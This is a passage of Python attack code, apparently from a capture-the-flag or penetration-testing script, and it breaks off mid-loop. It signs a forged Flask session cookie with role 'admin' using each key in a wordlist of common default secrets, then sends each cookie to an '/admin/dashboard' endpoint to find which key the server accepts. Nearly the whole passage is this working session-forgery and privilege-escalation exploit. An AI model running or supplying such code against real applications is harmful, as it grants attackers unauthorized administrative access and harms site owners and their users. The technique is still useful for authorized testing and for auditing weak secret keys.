    'secret', 'supersecret', 'dev', 'development', 'debug', 'password', 'admin', 'flask-secret-key', 'flask', 'mysecret', 'changeme', 'secret_key', 'app-secret', 'key', 'test', '123456', 'abc123', 'pleasechangeme', 'topsecret', 'verysecret', 'ultrasecret'
]

session_data = {"role":"admin"}

def make_cookie(secret):
    # Flask uses URLSafeTimedSerializer with salt 'cookie-session' and SHA1
    s = URLSafeTimedSerializer(
        secret_key=secret,
        salt='cookie-session'
    )
    return s.dumps(session_data)

for secret in secrets:
    try:
        cookie = make_cookie(secret)
    except Exception as e:
        continue
    headers = {'Cookie': f'session={cookie}'}
    try:
        r = requests.get(base + '/admin/dashboard', headers=headers, allow_redirects=False, timeout=5)
